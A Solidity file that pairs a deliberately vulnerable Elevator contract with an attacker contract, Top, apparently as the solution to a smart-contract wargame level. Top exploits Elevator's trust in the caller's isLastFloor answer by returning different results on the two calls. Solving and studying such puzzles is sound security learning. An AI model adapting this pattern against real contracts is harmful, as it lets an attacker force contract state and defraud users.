// SPDX-License-Identifier: MIT
pragma solidity ^0.6.0;

interface Building {
    function isLastFloor(uint256) external returns (bool);
}

contract Elevator {
    bool public top;
    uint256 public floor;

    function goTo(uint256 _floor) public {
        Building building = Building(msg.sender);

        if (!building.isLastFloor(_floor)) {
            floor = _floor;
            top = building.isLastFloor(floor);
        }
    }
}

interface IElevator {
    function goTo(uint256 _floor) external;
    function floor() external view returns (uint256);
}

contract Top {

    address elevator;

    function attack(address _addr) external {
        elevator = _addr;
        IElevator(elevator).goTo(10);
    }

    function isLastFloor(uint256 _floor) external returns (bool) {
        if (IElevator(elevator).floor() == 0) {
            return false;
        }
        return true;
    }
}
